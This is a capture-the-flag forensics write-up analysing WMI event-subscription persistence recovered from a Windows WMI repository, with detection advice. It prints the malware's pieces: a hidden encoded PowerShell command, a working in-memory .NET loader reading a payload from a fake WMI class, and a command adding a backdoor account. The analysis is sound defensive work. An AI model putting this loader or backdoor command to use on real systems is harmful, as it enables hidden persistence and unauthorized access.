---
layout: post
title: "THM: After Hours"
date: 2026-08-07 21:00:00
category: "Digital Forensics"
difficulty: "Medium"
tags: [thm, hacker-holidays, digital-forensics, windows, wmi, persistence, powershell, dotnet, reverse-engineering]
excerpt: "A forensics box instead of an attack for once. You're handed the raw WMI repository files from a Windows host, and hidden inside is a WMI event-subscription: a way malware survives reboots without ever touching Startup, Task Scheduler, or the Run keys. It's a nested doll. Each layer decodes to the next: hidden PowerShell, a payload stashed in a fake WMI class, a .NET assembly loaded straight into memory, and a backdoor account whose password is the flag."
---

<figure class="figure-narrow">
  <img src="{{ '/assets/img/after-hours-briefing.png' | relative_url }}" alt="TryHackMe room page: Concierge Briefing for After Hours. Category Forensics, difficulty Medium, 90 points. Long after the front desk closes and the pool lights dim, the resort's back-office machines keep humming. Someone, or something, has been logging in during the small hours, well after the night-shift technician has gone home. Nothing obvious shows up in Startup, Scheduled Tasks, or the registry Run keys. Whatever's keeping itself alive is hiding somewhere quieter, tucked away in a corner of the system most tools don't think to check. Itinerary: parse the provided system artifacts for hidden custom configuration data, locate the malicious class and extract its embedded payload, decode the payload and submit the recovered flag.">
  <figcaption>The briefing for After Hours. It rules out Startup, Scheduled Tasks and Run keys by name, and points at "a corner of the system most tools don't think to check." Paired with the files you're given, that's a very specific tell: WMI event-subscription persistence.</figcaption>
</figure>

A forensics room for a change, and my first time pulling apart WMI persistence, so this was
as much learning as solving. The whole challenge is a nested doll: you're handed some raw
Windows files, and every layer you crack open just reveals another encoded layer underneath.
It's genuinely clever, because each stage is a real technique attackers use to stay hidden, so
peeling it apart teaches you the technique from the defender's side.

It's a TryHackMe Hacker Holidays box, Digital Forensics, and the disclaimer this time is the
opposite of usual: you're the analyst, and the "malware" is a contained lab sample. Nothing
here runs against a live target.

## The whole nested doll at a glance

```
WMI repository (OBJECTS.DATA)
  └─ CommandLineEventConsumer  ->  runs hidden PowerShell (-enc, base64)
       └─ PowerShell reads a payload hidden in a FAKE WMI class property (ConfigData)
            └─ base64-decode -> deflate-decompress -> load a .NET assembly IN MEMORY
                 └─ .NET assembly: check the machine name, then run 'net user patch <b64> /add'
                      └─ the backdoor account's password (base64) IS the flag
```

## 1. Reading the file types is half the battle

The task files were:

```
INDEX.BTR
OBJECTS.DATA
MAPPING1.MAP  MAPPING2.MAP  MAPPING3.MAP
```

If you've never seen these, they're the **WMI repository**, normally living at
`C:\Windows\System32\wbem\Repository\`. `OBJECTS.DATA` is the main object store, `INDEX.BTR` is
its B-tree index, and the `MAPPING*.MAP` files are the mapping tables that tie them together.

Here's why recognising them mattered so much. The briefing explicitly ruled out Startup,
Scheduled Tasks and the Run keys, and said the thing was "hiding somewhere quieter." Put that
together with "here are the WMI repository files" and it's pointing straight at **WMI permanent
event subscriptions**, a well-known persistence technique (MITRE ATT&CK T1546.003). A WMI
subscription has three parts:

- an **`__EventFilter`**, the trigger (a time, a startup event, and so on),
- an **`EventConsumer`**, the payload that runs when the trigger fires (a command line or a
  script),
- and a **`__FilterToConsumerBinding`**, the link that marries a filter to a consumer.

When the trigger fires, WMI runs the consumer, usually as SYSTEM, and none of it appears in the
normal autorun spots. That invisibility is the entire point of the technique, and the whole
theme of the room.

## 2. Pulling the consumer payload out of the repository

The "proper" tool for this is `PyWMIPersistenceFinder.py` from the `WMI_Forensics` repo, but
it's a Python 2 script and it threw `TypeError` and `FileNotFoundError` under a modern Python,
so I didn't fight it. The payload text sits readably inside `OBJECTS.DATA` anyway, so plain old
`strings` and `grep` get you there:

```bash
strings OBJECTS.DATA | grep -iaE 'powershell|cmd\.exe|CommandLineTemplate|ScriptText'
```

Buried in a lot of legitimate WMI schema noise was the malicious `CommandLineEventConsumer`:

```
cmd /C powershell.exe -Sta -Nop -Window Hidden -enc JABmAGkAbABlAC...
```

Reading the flags: `-enc <base64>` runs a base64-encoded command, `-Window Hidden` hides the
window (the "quiet corner" again), `-Nop` skips the profile and `-Sta` sets a single-threaded
apartment. So every time this persistence fires, it runs a hidden, encoded PowerShell command.

## 3. Decoding the encoded PowerShell

PowerShell's `-EncodedCommand` is **UTF-16LE base64**, not plain base64, so you have to decode
with that in mind:

```bash
echo '<the -enc blob>' | base64 -d | iconv -f utf-16le -t utf-8
```

Out came the real script:

```powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream(
        [IO.MemoryStream][Convert]::FromBase64String($file),
        [IO.Compression.CompressionMode]::Decompress);
$b = New-Object Byte[](1024);
$r = $d.Read($b,0,1024);
while($r -gt 0){ $o.Write($b,0,$r); $r = $d.Read($b,0,1024); }
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@())) | Out-Null
```

This is the clever bit, and it does three things worth understanding:

1. It reads a property called `ConfigData` from a WMI class named
   `ROOT\cimv2:Win32_HardwareTelemetry`. That name *sounds* like a real Windows class, but it's
   **fake**. The attacker created it purely to stash a payload inside the WMI database itself.
   The malware body never sits on disk, it lives as a property value in WMI.
2. It base64-decodes that `ConfigData` value and then **deflate-decompresses** it.
3. It loads the decompressed bytes **directly as a .NET assembly in memory** and invokes the
   entry point.

That last step is fileless execution: the code runs entirely from memory, pulled out of WMI,
with nothing ever written to disk for a scanner to find.

## 4. Recovering the hidden .NET payload

The `ConfigData` blob is a big base64 string that also appears in `OBJECTS.DATA` (it starts
`7VZPbFRFGP...`). To reproduce exactly what the PowerShell does, base64-decode it and then do a
**raw** deflate decompress. "Raw" is the catch: in Python's `zlib`, raw deflate with no header
is `wbits = -15`.

```bash
echo '7VZPbFRFGP...' | base64 -d \
  | python3 -c 'import sys,zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(), -15))' \
  > payload.bin

file payload.bin
# payload.bin: PE32 executable ... Intel i386 Mono/.Net assembly, 3 sections
```

A genuine .NET executable, which confirms the chain. But grepping it for the flag, in ASCII and
in UTF-16, found nothing:

```bash
strings -e l payload.bin | grep -iaE 'THM|flag'   # nothing
```

So the flag isn't a stored string. It's either built at runtime or hidden behind a condition.
Which means I had to read the code.

## 5. Reading the assembly instead of running it

I didn't have `dotnet` or `ilspycmd`, but I did have `mono`. Running the payload directly just
bailed out:

```bash
mono payload.bin
# Execution halted: Environment mismatch.
```

That "Environment mismatch" is the payload's **own anti-analysis guard**. It refuses to do
anything unless it's on the intended victim. So rather than try to satisfy it, I disassembled to
IL with `monodis` and just read the logic. `ldstr` in IL means "load a string literal," so
grepping for it lists every string the program uses:

```bash
monodis payload.bin > payload.il
grep -n -iaE 'ldstr|MachineName|Environment' payload.il
```

The interesting lines:

```
IL_0000:  call   string [mscorlib]System.Environment::get_MachineName()
IL_0005:  ldstr  "bytelotusdc"
IL_0019:  ldstr  "cmd.exe"
IL_0024:  ldstr  "/c net user patch <BASE64_PASSWORD> /add"
IL_0045:  ldstr  "Execution halted: Environment mismatch."
```

Reading it top to bottom: the program compares `Environment.MachineName` against
`"bytelotusdc"`. On any other machine it prints "Environment mismatch" and quits, which is
exactly what happened when I ran it. That's a targeting and anti-sandbox check. If the check
passed, it would run `cmd.exe /c net user patch <base64> /add`, creating a hidden backdoor local
account called `patch`, with that base64 string as its password.

## 6. The flag

The backdoor account's password is base64, so decoding it gives the flag:

```bash
echo '<BASE64_PASSWORD>' | base64 -d
# THM{[redacted]}
```

Redacted here as always, and the value is a neat little pun on the account name it would have
created. The point worth keeping is that I never had to satisfy the machine-name check or
actually detonate anything. Reading the disassembly handed me the answer directly. When a binary
won't give up its secrets by running, read its code instead.

## Why every layer hides the next

This challenge is really a guided tour of one idea, defence evasion, done at five levels at once,
and it's worth spelling out because it's the actual lesson:

- **WMI persistence** hides the trigger and launcher in a database that autorun tools ignore.
- **Encoded PowerShell** hides the launcher's intent behind base64 and a hidden window.
- **Stashing the real payload in a fake WMI class property** hides the malware body inside WMI
  itself, so nothing lands on disk.
- **Reflective in-memory .NET loading** means the payload never becomes a file at all, defeating
  file-based scanning.
- **The machine-name check** means it only detonates on the intended victim, frustrating
  sandboxes and analysts running it somewhere else.

The forensic counter to all of it is exactly the path above: treat the WMI repository as an
artifact worth parsing, follow each decode and decompress step patiently, and when a binary
won't talk, disassemble it rather than execute it.

## Detection and remediation notes

- Turn on and monitor **WMI activity logging** (`Microsoft-Windows-WMI-Activity/Operational`) and
  alert on new `__EventFilter`, `EventConsumer` or `__FilterToConsumerBinding` objects.
- Hunt for **fake WMI classes and oversized property values** in `ROOT\cimv2`. A class named like
  `Win32_HardwareTelemetry` holding a base64 blob is a giant red flag.
- Alert on `powershell.exe -enc ... -Window Hidden` spawned by `WmiPrvSE.exe`.
- Watch for `net user ... /add` and unexpected new local accounts (here, `patch`).
- Tools that surface this: `PyWMIPersistenceFinder`, `python-cim` (Willi Ballenthin), and the WMI
  tab in Sysinternals Autoruns.

## What I took away

- **File types are a lead.** Recognising the WMI repository files, plus a briefing that ruled out
  the usual autoruns, basically named the technique before I'd decoded anything.
- **"Not on disk" is a strategy, not an accident.** The payload lived in a WMI property and ran
  from memory specifically so no file scanner would ever see it.
- **UTF-16LE for `-enc`.** PowerShell encoded commands aren't plain base64, and forgetting the
  UTF-16 step is an easy way to get garbage out.
- **Raw deflate is `wbits = -15`.** Matching the exact compression the loader used was the only
  fiddly part of extracting the assembly.
- **Read code, don't run it.** The anti-analysis check meant running the payload told me nothing,
  but `monodis` and a `grep` for `ldstr` handed me the whole plan, flag included.

## Commands used, quick reference

```bash
# 1. Find the consumer payload in the WMI store
strings OBJECTS.DATA | grep -iaE 'powershell|cmd\.exe|CommandLineTemplate'

# 2. Decode the PowerShell -enc (UTF-16LE base64)
echo '<enc blob>' | base64 -d | iconv -f utf-16le -t utf-8

# 3. Extract and decompress the hidden .NET payload (base64 -> raw deflate)
echo '<7VZ... blob>' | base64 -d \
  | python3 -c 'import sys,zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(),-15))' \
  > payload.bin
file payload.bin

# 4. Disassemble and read the logic
monodis payload.bin > payload.il
grep -n -iaE 'ldstr|MachineName|Environment' payload.il

# 5. Decode the flag (the backdoor account's base64 password)
echo '<BASE64_PASSWORD>' | base64 -d
```

> Room: After Hours on TryHackMe (Hacker Holidays 2026), Digital Forensics, Medium, 90 points.
> Flag left out as always. A properly satisfying nested-doll: WMI persistence, encoded
> PowerShell, a fake WMI class, an in-memory .NET load, and a backdoor password at the bottom.
> Five hiding techniques stacked, and the fix for all of them is to keep peeling.
